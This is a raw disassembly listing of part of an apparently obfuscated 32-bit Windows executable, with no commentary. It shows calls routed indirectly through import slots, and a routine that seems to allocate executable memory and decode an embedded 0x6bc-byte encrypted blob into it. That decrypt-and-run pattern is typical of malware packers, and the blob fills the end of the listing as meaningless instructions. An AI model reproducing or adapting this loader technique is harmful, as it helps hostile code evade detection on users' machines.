  4019fa:	push   edx
  4019fb:	push   esi
  4019fc:	call   0x401450
  401a01:	add    esp,0xc
  401a04:	pop    eax
  401a05:	push   eax
  401a06:	push   0x0
  401a08:	push   0x40301c
  401a0d:	pop    eax
  401a0e:	repz call DWORD PTR [eax]
  401a11:	pop    eax
  401a12:	push   eax
  401a13:	push   0x0
  401a15:	push   0x40301c
  401a1a:	pop    eax
  401a1b:	repz call DWORD PTR [eax]
  401a1e:	pop    eax
  401a1f:	sub    esp,0xffffffb8
  401a22:	mov    ebp,DWORD PTR [esp]
  401a25:	add    esp,0x4
  401a28:	ret    
  401a29:	add    BYTE PTR [eax],al
  401a2b:	add    BYTE PTR [ebx-0x1374aa01],cl
  401a31:	sub    esp,0x58
  401a34:	push   eax
  401a35:	mov    esi,0x0
  401a3a:	push   esi
  401a3b:	push   0x40301c
  401a40:	pop    eax
  401a41:	repz call DWORD PTR [eax]
  401a44:	pop    eax
  401a45:	push   eax
  401a46:	push   DWORD PTR [eax+0x54]
  401a49:	push   edx
  401a4a:	call   0x401758
  401a4f:	add    esp,0x8
  401a52:	pop    eax
  401a53:	push   eax
  401a54:	push   0x0
  401a56:	push   0x40302c
  401a5b:	pop    eax
  401a5c:	repz call DWORD PTR [eax]
  401a5f:	pop    eax
  401a60:	sub    esp,0xffffffa8
  401a63:	mov    ebp,DWORD PTR [esp]
  401a66:	add    esp,0x4
  401a69:	ret    
	...
  401a7a:	add    BYTE PTR [eax],al
  401a7c:	mov    edi,edi
  401a7e:	push   ebp
  401a7f:	mov    ebp,esp
  401a81:	sub    esp,0x1c
  401a84:	push   eax
  401a85:	push   ebx
  401a86:	push   esi
  401a87:	call   0x401318
  401a8c:	add    esp,0x8
  401a8f:	pop    eax
  401a90:	push   eax
  401a91:	mov    ebx,0x0
  401a96:	push   ebx
  401a97:	push   0x403030
  401a9c:	pop    eax
  401a9d:	repz call DWORD PTR [eax]
  401aa0:	pop    eax
  401aa1:	push   eax
  401aa2:	mov    eax,0x0
  401aa7:	push   eax
  401aa8:	push   0x403068
  401aad:	pop    eax
  401aae:	repz call DWORD PTR [eax]
  401ab1:	pop    eax
  401ab2:	sub    esp,0xffffffe4
  401ab5:	mov    ebp,DWORD PTR [esp]
  401ab8:	add    esp,0x4
  401abb:	ret    
  401abc:	mov    edi,edi
  401abe:	push   ebp
  401abf:	mov    ebp,esp
  401ac1:	sub    esp,0x44
  401ac4:	push   eax
  401ac5:	mov    esi,0x40
  401aca:	push   esi
  401acb:	mov    eax,0x1000
  401ad0:	push   eax
  401ad1:	push   0x6bc
  401ad6:	mov    ecx,0x0
  401adb:	push   ecx
  401adc:	push   0x0
  401ade:	xor    DWORD PTR [esp],0x2ac9d380
  401ae5:	pop    esi
  401ae6:	sub    esi,0x2a89a358
  401aec:	push   DWORD PTR [esi]
  401aee:	sub    DWORD PTR [esp],0x2
  401af2:	push   0x40304c
  401af7:	pop    esi
  401af8:	pop    DWORD PTR [esi]
  401afa:	push   0x40304c
  401aff:	pop    eax
  401b00:	repz call DWORD PTR [eax]
  401b03:	xchg   DWORD PTR [esp],eax
  401b06:	pop    edi
  401b07:	mov    DWORD PTR [eax+0x26c],edi
  401b0d:	mov    ecx,DWORD PTR [eax+0x26c]
  401b13:	mov    ebx,ecx
  401b15:	sub    ecx,ecx
  401b17:	dec    ecx
  401b18:	and    ecx,0x401ece
  401b1e:	mov    edx,0x5d43a241
  401b23:	xor    edi,edi
  401b25:	cmp    edi,0x6bc
  401b2b:	je     0x401b4a
  401b2d:	sub    edi,0xfffffffc
  401b30:	mov    esi,edx
  401b32:	neg    esi
  401b34:	add    esi,DWORD PTR [ecx]
  401b36:	add    esi,0x1
  401b39:	mov    DWORD PTR [ebx],esi
  401b3b:	push   DWORD PTR [ecx]
  401b3d:	mov    edx,0xfffffffc
  401b42:	sub    ecx,edx
  401b44:	sub    ebx,edx
  401b46:	pop    edx
  401b47:	dec    edx
  401b48:	jmp    0x401b25
  401b4a:	push   eax
  401b4b:	mov    ecx,0x0
  401b50:	push   ecx
  401b51:	push   0x403034
  401b56:	pop    eax
  401b57:	repz call DWORD PTR [eax]
  401b5a:	pop    eax
  401b5b:	sub    esp,0xffffffbc
  401b5e:	pop    ebp
  401b5f:	ret    
  401b60:	mov    edi,edi
  401b62:	push   ebp
  401b63:	mov    ebp,esp
  401b65:	sub    esp,0x4c
  401b68:	push   eax
  401b69:	push   esi
  401b6a:	push   esi
  401b6b:	push   DWORD PTR [eax+0x1b8]
  401b71:	call   0x401abc
  401b76:	add    esp,0xc
  401b79:	pop    eax
  401b7a:	push   eax
  401b7b:	mov    edi,0x0
  401b80:	push   edi
  401b81:	push   0x403024
  401b86:	pop    eax
  401b87:	repz call DWORD PTR [eax]
  401b8a:	pop    eax
  401b8b:	push   eax
  401b8c:	push   0x403038
  401b91:	pop    eax
  401b92:	repz call DWORD PTR [eax]
  401b95:	pop    eax
  401b96:	sub    esp,0xffffffb4
  401b99:	mov    ebp,DWORD PTR [esp]
  401b9c:	add    esp,0x4
  401b9f:	ret    
  401ba0:	mov    edi,edi
  401ba2:	push   ebp
  401ba3:	mov    ebp,esp
  401ba5:	sub    esp,0x44
  401ba8:	push   eax
  401ba9:	push   ecx
  401baa:	push   ebx
  401bab:	push   DWORD PTR [eax+0x2a8]
  401bb1:	push   edx
  401bb2:	call   0x401204
  401bb7:	add    esp,0x10
  401bba:	pop    eax
  401bbb:	push   eax
  401bbc:	lea    ecx,[eax-0x100]
  401bc2:	push   ecx
  401bc3:	push   0x403044
  401bc8:	pop    eax
  401bc9:	repz call DWORD PTR [eax]
  401bcc:	test   eax,eax
  401bce:	jne    0x401bbc
  401bd0:	pop    eax
  401bd1:	push   eax
  401bd2:	lea    esi,[eax-0x100]
  401bd8:	push   esi
  401bd9:	push   0x403044
  401bde:	pop    eax
  401bdf:	repz call DWORD PTR [eax]
  401be2:	test   eax,eax
  401be4:	jne    0x401bd2
  401be6:	pop    eax
  401be7:	sub    esp,0xffffffbc
  401bea:	mov    ebp,DWORD PTR [esp]
  401bed:	add    esp,0x4
  401bf0:	ret    
  401bf1:	add    BYTE PTR [eax],al
  401bf3:	add    BYTE PTR [eax],al
  401bf5:	add    BYTE PTR [eax],al
  401bf7:	add    BYTE PTR [ebx-0x1374aa01],cl
  401bfd:	sub    esp,0x60
  401c00:	push   eax
  401c01:	mov    ebx,0x0
  401c06:	push   ebx
  401c07:	push   0x40301c
  401c0c:	pop    eax
  401c0d:	repz call DWORD PTR [eax]
  401c10:	pop    eax
  401c11:	push   eax
  401c12:	push   ebx
  401c13:	push   edx
  401c14:	push   esi
  401c15:	call   0x4015ec
  401c1a:	add    esp,0xc
  401c1d:	pop    eax
  401c1e:	push   eax
  401c1f:	push   0x403038
  401c24:	pop    eax
  401c25:	repz call DWORD PTR [eax]
  401c28:	pop    eax
  401c29:	sub    esp,0xffffffa0
  401c2c:	mov    ebp,DWORD PTR [esp]
  401c2f:	add    esp,0x4
  401c32:	ret    
  401c33:	add    BYTE PTR [eax],al
  401c35:	add    BYTE PTR [eax],al
  401c37:	add    BYTE PTR [ebx-0x1374aa01],cl
  401c3d:	sub    esp,0x30
  401c40:	push   eax
  401c41:	push   esi
  401c42:	push   esi
  401c43:	push   ebx
  401c44:	call   0x4013fc
  401c49:	add    esp,0xc
  401c4c:	pop    eax
  401c4d:	push   eax
  401c4e:	mov    esi,0x0
  401c53:	push   esi
  401c54:	push   0x403008
  401c59:	pop    eax
  401c5a:	repz call DWORD PTR [eax]
  401c5d:	pop    eax
  401c5e:	push   eax
  401c5f:	push   0x0
  401c61:	push   0x40300c
  401c66:	pop    eax
  401c67:	repz call DWORD PTR [eax]
  401c6a:	pop    eax
  401c6b:	sub    esp,0xffffffd0
  401c6e:	mov    ebp,DWORD PTR [esp]
  401c71:	add    esp,0x4
  401c74:	ret    
  401c75:	add    BYTE PTR [eax],al
  401c77:	add    BYTE PTR [ebx-0x1374aa01],cl
  401c7d:	sub    esp,0x48
  401c80:	push   eax
  401c81:	push   edx
  401c82:	push   ebx
  401c83:	push   DWORD PTR [eax+0xc0]
  401c89:	push   DWORD PTR [eax+0x3c4]
  401c8f:	call   0x4019f0
  401c94:	add    esp,0x10
  401c97:	pop    eax
  401c98:	push   eax
  401c99:	mov    eax,0x0
  401c9e:	push   eax
  401c9f:	push   0x403018
  401ca4:	pop    eax
  401ca5:	repz call DWORD PTR [eax]
  401ca8:	pop    eax
  401ca9:	push   eax
  401caa:	mov    esi,0x0
  401caf:	push   esi
  401cb0:	push   0x403054
  401cb5:	pop    eax
  401cb6:	repz call DWORD PTR [eax]
  401cb9:	pop    eax
  401cba:	sub    esp,0xffffffb8
  401cbd:	mov    ebp,DWORD PTR [esp]
  401cc0:	add    esp,0x4
  401cc3:	ret    
  401cc4:	mov    edi,edi
  401cc6:	push   ebp
  401cc7:	mov    ebp,esp
  401cc9:	sub    esp,0x34
  401ccc:	push   eax
  401ccd:	push   ecx
  401cce:	push   DWORD PTR [eax+0x248]
  401cd4:	push   DWORD PTR [eax+0x3a8]
  401cda:	push   ebx
  401cdb:	call   0x40183c
  401ce0:	add    esp,0x10
  401ce3:	pop    eax
  401ce4:	push   eax
  401ce5:	push   0x403048
  401cea:	pop    eax
  401ceb:	repz call DWORD PTR [eax]
  401cee:	pop    eax
  401cef:	push   eax
  401cf0:	lea    ecx,[eax-0x100]
  401cf6:	push   ecx
  401cf7:	push   0x403044
  401cfc:	pop    eax
  401cfd:	repz call DWORD PTR [eax]
  401d00:	test   eax,eax
  401d02:	jne    0x401cf0
  401d04:	pop    eax
  401d05:	sub    esp,0xffffffcc
  401d08:	mov    ebp,DWORD PTR [esp]
  401d0b:	add    esp,0x4
  401d0e:	ret    
  401d0f:	add    BYTE PTR [ebx-0x1374aa01],cl
  401d15:	sub    esp,0x4c
  401d18:	push   eax
  401d19:	push   0x0
  401d1b:	push   0x403000
  401d20:	pop    eax
  401d21:	repz call DWORD PTR [eax]
  401d24:	pop    eax
  401d25:	push   eax
  401d26:	push   ecx
  401d27:	push   edi
  401d28:	push   DWORD PTR [eax+0x3d8]
  401d2e:	call   0x401a7c
  401d33:	add    esp,0xc
  401d36:	pop    eax
  401d37:	push   eax
  401d38:	mov    ebx,0x0
  401d3d:	push   ebx
  401d3e:	push   0x403078
  401d43:	pop    eax
  401d44:	repz call DWORD PTR [eax]
  401d47:	pop    eax
  401d48:	sub    esp,0xffffffb4
  401d4b:	mov    ebp,DWORD PTR [esp]
  401d4e:	add    esp,0x4
  401d51:	ret    
  401d52:	add    BYTE PTR [eax],al
  401d54:	mov    edi,edi
  401d56:	push   ebp
  401d57:	mov    ebp,esp
  401d59:	sub    esp,0x38
  401d5c:	push   eax
  401d5d:	push   0x0
  401d5f:	push   0x403030
  401d64:	pop    eax
  401d65:	repz call DWORD PTR [eax]
  401d68:	pop    eax
  401d69:	push   eax
  401d6a:	push   esi
  401d6b:	push   edi
  401d6c:	push   ebx
  401d6d:	call   0x4011b4
  401d72:	add    esp,0xc
  401d75:	pop    eax
  401d76:	push   eax
  401d77:	push   0x0
  401d79:	push   0x403018
  401d7e:	pop    eax
  401d7f:	repz call DWORD PTR [eax]
  401d82:	pop    eax
  401d83:	sub    esp,0xffffffc8
  401d86:	mov    ebp,DWORD PTR [esp]
  401d89:	add    esp,0x4
  401d8c:	ret    
  401d8d:	add    BYTE PTR [eax],al
  401d8f:	add    BYTE PTR [ebx-0x1374aa01],cl
  401d95:	sub    esp,0x28
  401d98:	push   eax
  401d99:	push   0x0
  401d9b:	push   0x403018
  401da0:	pop    eax
  401da1:	repz call DWORD PTR [eax]
  401da4:	pop    eax
  401da5:	push   eax
  401da6:	push   esi
  401da7:	push   DWORD PTR [eax+0x2b8]
  401dad:	call   0x401670
  401db2:	add    esp,0x8
  401db5:	pop    eax
  401db6:	push   eax
  401db7:	mov    edi,0x0
  401dbc:	push   edi
  401dbd:	push   0x403068
  401dc2:	pop    eax
  401dc3:	repz call DWORD PTR [eax]
  401dc6:	pop    eax
  401dc7:	sub    esp,0xffffffd8
  401dca:	mov    ebp,DWORD PTR [esp]
  401dcd:	add    esp,0x4
  401dd0:	ret    
	...
  401ddd:	add    BYTE PTR [eax],al
  401ddf:	add    BYTE PTR [ebx-0x1374aa01],cl
  401de5:	sub    esp,0x50
  401de8:	push   eax
  401de9:	mov    esi,0x0
  401dee:	push   esi
  401def:	push   0x403068
  401df4:	pop    eax
  401df5:	repz call DWORD PTR [eax]
  401df8:	pop    eax
  401df9:	push   eax
  401dfa:	push   DWORD PTR [eax+0x358]
  401e00:	push   ecx
  401e01:	call   0x401e30
  401e06:	add    esp,0x8
  401e09:	pop    eax
  401e0a:	push   eax
  401e0b:	mov    edi,0x0
  401e10:	push   edi
  401e11:	push   0x403078
  401e16:	pop    eax
  401e17:	repz call DWORD PTR [eax]
  401e1a:	pop    eax
  401e1b:	sub    esp,0xffffffb0
  401e1e:	mov    ebp,DWORD PTR [esp]
  401e21:	add    esp,0x4
  401e24:	ret    
	...
  401e2d:	add    BYTE PTR [eax],al
  401e2f:	add    BYTE PTR [ebx-0x1374aa01],cl
  401e35:	sub    esp,0x54
  401e38:	push   eax
  401e39:	push   0x0
  401e3b:	push   0x403008
  401e40:	pop    eax
  401e41:	repz call DWORD PTR [eax]
  401e44:	pop    eax
  401e45:	push   eax
  401e46:	push   edi
  401e47:	push   ebx
  401e48:	call   0x4013a4
  401e4d:	add    esp,0x8
  401e50:	pop    eax
  401e51:	push   eax
  401e52:	mov    edi,0x0
  401e57:	push   edi
  401e58:	push   0x403024
  401e5d:	pop    eax
  401e5e:	repz call DWORD PTR [eax]
  401e61:	pop    eax
  401e62:	sub    esp,0xffffffac
  401e65:	mov    ebp,DWORD PTR [esp]
  401e68:	add    esp,0x4
  401e6b:	ret    
	...
  401e74:	mov    edi,edi
  401e76:	push   ebp
  401e77:	mov    ebp,esp
  401e79:	sub    esp,0x50
  401e7c:	push   eax
  401e7d:	push   0x0
  401e7f:	push   0x403024
  401e84:	pop    eax
  401e85:	repz call DWORD PTR [eax]
  401e88:	pop    eax
  401e89:	push   eax
  401e8a:	push   esi
  401e8b:	push   edi
  401e8c:	call   0x40135c
  401e91:	add    esp,0x8
  401e94:	pop    eax
  401e95:	push   eax
  401e96:	push   0x0
  401e98:	push   0x403068
  401e9d:	pop    eax
  401e9e:	repz call DWORD PTR [eax]
  401ea1:	pop    eax
  401ea2:	sub    esp,0xffffffb0
  401ea5:	mov    ebp,DWORD PTR [esp]
  401ea8:	add    esp,0x4
  401eab:	ret    
  401eac:	ds cmp eax,0x83d988e2
  401eb2:	movntps XMMWORD PTR [ebx+eax*1],xmm1
  401eb6:	inc    ebx
  401eb7:	pushf  
  401eb8:	sti    
  401eb9:	cli    
  401eba:	adc    bh,BYTE PTR [ebp-0x7b5e02b]
  401ec0:	cmp    ch,BYTE PTR [ecx-0x4]
  401ec3:	test   DWORD PTR [bx],esi
  401ec6:	push   es
  401ec7:	inc    edi
  401ec8:	or     DWORD PTR [esi],ecx
  401eca:	and    al,0xda
  401ecc:	add    eax,0x93fa9077
  401ed1:	mov    ch,0x76
  401ed3:	add    DWORD PTR [ebp+esi*4+0xf0b0274],edx
  401eda:	enter  0x508f,0x68
  401ede:	icebp  
  401edf:	pop    eax
  401ee0:	aam    0x29
  401ee2:	repnz lods eax,DWORD PTR ds:[esi]
  401ee4:	xor    cl,BYTE PTR [ebp*8-0x2cff08cf]
  401eeb:	dec    esp
  401eec:	test   DWORD PTR [eax],0x65f797d1
  401ef2:	iret   
  401ef3:	or     eax,edi
  401ef5:	ror    ebp,cl
  401ef7:	outs   dx,BYTE PTR ds:[esi]
  401ef8:	clc    
  401ef9:	aas    
  401efa:	retf   
  401efb:	mov    eax,ds:0xcfc971f8
  401f00:	clc    
  401f01:	aad    0xc7
  401f03:	cmp    edi,ecx
  401f05:	inc    ecx
  401f06:	lds    edi,FWORD PTR [ebx]
  401f08:	stc    
  401f09:	cdq    
  401f0a:	adc    edi,DWORD PTR [ebx]
  401f0c:	shl    BYTE PTR ds:0x62133ee9,1
  401f12:	push   0xe66263b7
  401f17:	mov    ebx,0xa40fd863
  401f1c:	push   edi
  401f1d:	fimul  WORD PTR ds:0x69b4a4
  401f23:	pop    esi
  401f24:	lds    ebp,FWORD PTR [ecx-0x2]
  401f27:	pop    ebp
  401f28:	jb     0x401f7c
  401f2a:	out    dx,al
  401f2b:	pusha  
  401f2c:	jb     0x401f80
  401f2e:	jne    0x401ed7
  401f30:	outs   dx,BYTE PTR ds:[esi]
  401f31:	xor    eax,0x9dd21268
  401f36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f37:	jle    0x401f77
  401f39:	or     eax,0x6ea3c70d
  401f3e:	jnp    0x401f5b
  401f40:	imul   DWORD PTR [ebp-0x32]
  401f43:	and    eax,DWORD PTR [eax-0x17dbc98c]
  401f49:	mov    edx,0x234d89a6
  401f4e:	in     al,dx
  401f4f:	out    dx,al
  401f50:	scas   al,BYTE PTR es:[edi]
  401f51:	xchg   ebx,eax
  401f52:	ds inc edx
  401f54:	scas   al,BYTE PTR es:[edi]
  401f55:	jmp    0xee34ea9e
  401f5a:	lds    ecx,FWORD PTR [edi-0x7fca7f3]
  401f60:	or     eax,0x75f80168
  401f65:	adc    al,0x5
  401f67:	clc    
  401f68:	jne    0x401fe8
  401f6a:	add    esi,edi
  401f6c:	retf   
  401f6d:	mov    cs,WORD PTR [edi+ebp*8-0x1075cb2f]
  401f74:	rol    DWORD PTR [ebp+edx*1+0x127e9aa5],1
  401f7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f7c:	push   esp
  401f7d:	sub    edx,DWORD PTR [esi]
  401f7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f80:	push   esp
  401f81:	push   ds
  401f82:	mov    eax,0xbba93d68
  401f87:	push   0xf017063d
  401f8c:	jno    0x401fb8
  401f8e:	imul   ebx,eax,0x6b
  401f91:	das    
  401f92:	imul   ebx,eax,0xd86c6753
  401f98:	push   ebx
  401f99:	repnz bound eax,QWORD PTR [ebx+0x54]
  401f9d:	pop    esp
  401f9e:	pusha  
  401f9f:	inc    edx
  401fa0:	retf   0xb5c0
  401fa3:	inc    ecx
  401fa4:	and    cl,ch
  401fa6:	(bad)
  401fab:	jecxz  0x401f8d
  401fad:	push   edx
  401fae:	outs   dx,BYTE PTR ds:[esi]
  401faf:	pop    es
  401fb0:	xor    DWORD PTR [edx+eax*8-0x1305cfa2],esp
  401fb7:	mov    dh,0x87
  401fb9:	stc    
  401fba:	aas    
  401fbb:	iret   
  401fbc:	outs   dx,DWORD PTR ds:[esi]
  401fbd:	and    eax,DWORD PTR [eax-0x31]
  401fc0:	outs   dx,DWORD PTR ds:[esi]
  401fc1:	scas   al,BYTE PTR es:[edi]
  401fc2:	test   BYTE PTR [ebx],cl
  401fc4:	std    
  401fc5:	mov    dl,0x88
  401fc7:	jno    0x401fbd
  401fc9:	repz pushf 
  401fcb:	jno    0x401fe1
  401fcd:	imul   esi,DWORD PTR [eax+0x229d6caa],0x54f5f7bc
  401fd7:	es cld 
  401fd9:	pop    ebp
  401fda:	push   edx
  401fdb:	push   esi
  401fdc:	cld    
  401fdd:	pop    ebp
  401fde:	dec    edi
  401fdf:	(bad)  
  401fe0:	dec    esp
  401fe1:	mov    cl,0x4c
  401fe3:	sbb    eax,0x89c73c5d
  401fe8:	lods   eax,DWORD PTR ds:[esi]
  401fe9:	nop
  401fea:	das    
  401feb:	mov    es,WORD PTR [esp+eiz*8]
  401fee:	sub    al,0xe4
  401ff0:	adc    BYTE PTR [eax],bh
  401ff2:	xchg   esp,eax
  401ff3:	out    0x67,al
  401ff5:	mov    ebp,eax
  401ff7:	jno    0x402030
  401ff9:	pop    ss
  401ffa:	loope  0x402061
  401ffc:	fdiv   QWORD PTR [ebp-0x22]
  401fff:	mov    ebx,0x8a67cde8
  402004:	in     al,dx
  402005:	push   ss
  402006:	mov    eax,ds:0x2a2f6617
  40200b:	outs   dx,DWORD PTR ds:[esi]
  40200c:	xchg   BYTE PTR [esi],bh
  40200e:	fbstp  TBYTE PTR [eax-0x3f2abe66]
  402014:	push   ecx
  402015:	mov    ebx,ecx
  402017:	and    ch,bl
  402019:	shr    bl,cl
  40201b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40201c:	popf   
  40201d:	inc    edi
  40201e:	sub    dh,BYTE PTR [ecx]
  402020:	in     eax,0x4f
  402022:	lods   eax,DWORD PTR ds:[esi]
  402023:	icebp  
  402024:	pop    ecx
  402025:	mov    dl,BYTE PTR [ebx-0x6e75a17d]
  40202b:	push   cs
  40202c:	daa    
  40202d:	push   ss
  40202e:	(bad)  
  40202f:	xor    cl,BYTE PTR [edi]
  402031:	mov    esi,ss
  402033:	xor    cl,BYTE PTR [edi]
  402035:	(bad)  
  402036:	dec    ebx
  402037:	inc    edi
  402038:	push   cs
  402039:	pop    es
  40203a:	pop    ecx
  40203b:	ror    BYTE PTR [ebp-0x1632a5ed],cl
  402041:	arpl   bx,sp
  402043:	mov    eax,ds:0xf932b43c
  402048:	lea    eax,[esi]
  40204a:	call   0xeb53:0x975ddefd
  402051:	mov    dh,0xc8
  402053:	adc    eax,DWORD PTR [ebx-0x56]
  402056:	jo     0x4020cb
  402058:	into   
  402059:	jne    0x4020bc
  40205b:	sbb    dh,cl
  40205d:	retf   
  40205e:	imul   esi,DWORD PTR [eax+0x2f],0x4f
  402062:	xor    BYTE PTR [ecx-0x5ae9feef],bl
  402068:	adc    al,BYTE PTR [ecx]
  40206a:	adc    al,0x8d
  40206c:	xchg   esp,eax
  40206d:	add    DWORD PTR [edx],edx
  40206f:	(bad)  
  402070:	in     al,dx
  402071:	imul   edx,DWORD PTR [eax],0xd69eccd
  402077:	inc    ebx
  402078:	push   ebp
  402079:	rcl    BYTE PTR [esi+0x7cb0e13e],0x49
  402080:	in     eax,0xb0
  402082:	jp     0x402031
  402084:	in     al,0xe6
  402086:	test   al,0xad
  402088:	in     al,0xe6
  40208a:	(bad)  
  40208b:	cmp    BYTE PTR ds:0x317987f3,ah
  402091:	sub    al,0xdd
  402093:	xchg   ecx,eax
  402094:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402095:	xor    BYTE PTR [esi-0x6e],ah
  402098:	nop
  402099:	sub    bh,ch
  40209b:	sahf   
  40209c:	mov    ah,0x2b
  40209e:	fstp   TBYTE PTR ss:[edi]
  4020a1:	popf   
  4020a2:	pop    esp
  4020a3:	fidiv  WORD PTR [esi]
  4020a5:	daa    
  4020a6:	shl    dh,cl
  4020a8:	mov    edi,0xb75cec97
  4020ad:	fld    DWORD PTR [eax]
  4020af:	pop    ebp
  4020b0:	xlat   BYTE PTR ds:[ebx]
  4020b1:	dec    esi
  4020b2:	or     al,cl
  4020b4:	js     0x40211d
  4020b6:	or     cl,al
  4020b8:	js     0x4020ac
  4020ba:	inc    esi
  4020bb:	icebp  
  4020bc:	add    DWORD PTR [ebx+0x4c],ebp
  4020bf:	lock push edi
  4020c1:	jg     0x4020f5
  4020c3:	addr16 pop edx
  4020c5:	jg     0x4020f7
  4020c7:	les    esp,FWORD PTR [ebx]
  4020c9:	fdiv   DWORD PTR [edi+0x16f44838]
  4020cf:	mov    DWORD PTR [eax],esi
  4020d1:	xor    ebx,DWORD PTR [eax]
  4020d3:	mov    DWORD PTR [eax],esi
  4020d5:	mov    edx,DWORD PTR [edi-0x687476ff]
  4020db:	add    DWORD PTR [ecx-0x72735c00],ecx
  4020e1:	and    al,0x69
  4020e3:	xchg   ecx,eax
  4020e4:	mov    cl,0x24
  4020e6:	addr16 xchg ecx,eax
  4020e8:	mov    cl,0x23
  4020ea:	fnstenv [ebp+0x760a73b5]
  4020f0:	jns    0x4020c6
  4020f2:	xchg   ebx,eax
  4020f3:	imul   edi,DWORD PTR [ebp+0x4a],0xcb33f4cd
  4020fa:	retf   
  4020fb:	hlt    
  4020fc:	xor    edx,DWORD PTR [eax-0x41]
  4020ff:	imul   esp,DWORD PTR [edi+0x25f5b053],0x9af53360
  402109:	retf   0xf034
  40210c:	repnz leave 
  40210e:	xchg   esp,esi
  402110:	ja     0x40209c
  402112:	cli    
  402113:	clc    
  402114:	into   
  402115:	mov    DWORD PTR [ebp-0x7],ecx
  402118:	push   ds
  402119:	loopne 0x4020f1
  40211b:	outs   dx,DWORD PTR ds:[esi]
  40211c:	das    
  40211d:	jecxz  0x4020e6
  40211f:	sti    
  402120:	sub    eax,0xa3bc4a91
  402125:	mov    WORD PTR [ebx-0x4d],?
  402128:	das    
  402129:	pop    ebx
  40212a:	iret   
  40212b:	add    al,0x80
  40212d:	scas   eax,DWORD PTR es:[edi]
  40212e:	aaa    
  40212f:	or     ecx,edx
  402131:	push   es
  402132:	xor    al,0x5f
  402134:	fstp   QWORD PTR [ebp+edi*4+0x65]
  402138:	bound  ebx,QWORD PTR ds:0x63edf64b
  40213e:	pop    ecx
  40213f:	and    DWORD PTR [edx],0x67
  402142:	scas   al,BYTE PTR es:[edi]
  402143:	xor    BYTE PTR [eax+0x514c2027],ch
  402149:	sub    BYTE PTR [esi],bl
  40214b:	dec    esp
  40214c:	rcr    DWORD PTR [ebp-0x5eea26e0],1
  402152:	and    dh,bh
  402154:	adc    al,0xa1
  402156:	sbb    eax,0x8fa0657e
  40215b:	mov    ds:0xaae29f79,al
  402160:	and    al,0x8b
  402162:	ror    BYTE PTR [edx],0x83
  402165:	jecxz  0x40217e
  402167:	pop    edi
  402168:	shl    DWORD PTR [esp+ebp*2],cl
  40216b:	pop    esi
  40216c:	sub    DWORD PTR [ecx-0x3e],eax
  40216f:	loope  0x402160
  402171:	push   ebp
  402172:	stos   DWORD PTR es:[edi],eax
  402173:	jno    0x4021c6
  402175:	sbb    DWORD PTR [ecx],ecx
  402177:	std    
  402178:	and    al,0xa5
  40217a:	stc    
  40217b:	add    BYTE PTR [ebx-0x30a8dd1f],bl
  402181:	data16 repnz push bx
  402185:	cld    
  402186:	lock push bx
  402189:	xchg   DWORD PTR [ebx+ecx*1+0x54],edi
  40218d:	xchg   DWORD PTR [edx-0x6a],edi
  402190:	or     ch,BYTE PTR [eax]
  402192:	js     0x40212a
  402194:	or     ch,BYTE PTR [ebp+0x2e8ea66c]
  40219a:	push   0xffffffa6
  40219c:	mov    ?,WORD PTR [ecx]
  40219e:	pop    ebx
  40219f:	push   esp
  4021a0:	sbb    ch,BYTE PTR [edx]
  4021a2:	pop    esp
  4021a3:	dec    edi
  4021a4:	imul   esi,DWORD PTR [ebp+0x7bca01e],0x6c
  4021ab:	or     al,cl
  4021ad:	outs   dx,DWORD PTR ds:[esi]
  4021ae:	push   0x1a
  4021b0:	shr    DWORD PTR [edi-0x41],0x9d
  4021b4:	test   eax,0xae080d74
  4021b9:	fmul   QWORD PTR [ebx]
  4021bb:	sbb    BYTE PTR [esi-0x4d669f24],ch
  4021c1:	add    BYTE PTR [esi-0x57],bl
  4021c4:	mov    dl,0x0
  4021c6:	pop    ebx
  4021c7:	(bad)  
  4021c8:	mov    esi,0x190baeff
  4021cd:	pop    ecx
  4021ce:	pop    ecx
  4021cf:	aaa    
  4021d0:	loope  0x40217c
  4021d2:	loop   0x4021d3
  4021d4:	mov    dl,0x94
  4021d6:	arpl   cx,bp
  4021d8:	mov    bh,0xc7
  4021da:	and    DWORD PTR [eax+0x65],edx
  4021dd:	cs enter 0x9550,0xa2
  4021e2:	into   
  4021e3:	jne    0x402179
  4021e5:	mov    dl,0xcc
  4021e7:	jne    0x40217e
  4021e9:	(bad)  
  4021ea:	rcl    DWORD PTR [edi-0x7c],1
  4021ed:	and    BYTE PTR [esp+ebx*4-0x58],bl
  4021f1:	and    al,0xab
  4021f3:	out    dx,al
  4021f4:	clc    
  4021f5:	and    ebx,ecx
  4021f7:	push   esi
  4021f8:	stc    
  4021f9:	xor    edx,edi
  4021fb:	push   esi
  4021fc:	push   eax
  4021fd:	mov    bh,0xbd
  4021ff:	pop    ebx
  402200:	mov    al,ds:0xa0c3ebb6
  402205:	(bad)  
  402206:	jmp    0xeb8819ce
  40220b:	out    0xf7,eax
  40220d:	push   edi
  40220e:	jmp    0xf3ee18fa
  402213:	out    0x4c,al
  402215:	mov    edx,0x12a5404b
  40221a:	into   
  40221b:	or     DWORD PTR [ebx],ebx
  40221d:	xchg   esp,eax
  40221e:	sub    eax,0x327f7bcd
  402223:	jp     0x402283
  402225:	jge    0x4021e4
  402227:	scas   al,BYTE PTR es:[edi]
  402228:	popa   
  402229:	inc    eax
  40222a:	inc    esi
  40222b:	xchg   edi,eax
  40222c:	in     eax,dx
  40222d:	xor    edi,ebp
  40222f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402230:	in     eax,dx
  402231:	xor    edi,ebx
  402233:	(bad)  
  402234:	fnstenv [ebx]
  402236:	clc    
  402237:	(bad)  
  402238:	xchg   ebx,eax
  402239:	push   ebx
  40223a:	test   BYTE PTR [edi-0x702ac46d],0x93
  402241:	cmp    ebp,DWORD PTR [ecx]
  402243:	dec    ecx
  402244:	fwait
  402245:	cmp    esp,DWORD PTR [edi]
  402247:	dec    ecx
  402248:	adc    DWORD PTR [edx],0x24
  40224b:	dec    ecx
  40224c:	sbb    DWORD PTR [esi-0x3d482b0e],0xffffffa9
  402253:	fidiv  WORD PTR [edi+0x7fc6a7c2]
  402259:	ret    0xc6a4
  40225c:	or     eax,ecx
  40225e:	sub    eax,0x2a7ff491
  402263:	xchg   ecx,eax
  402264:	hlt    
  402265:	mov    bl,0xe8
  402267:	loope  0x40221e
  402269:	jl     0x402258
  40226b:	mov    ds:0xa3f8a0ba,al
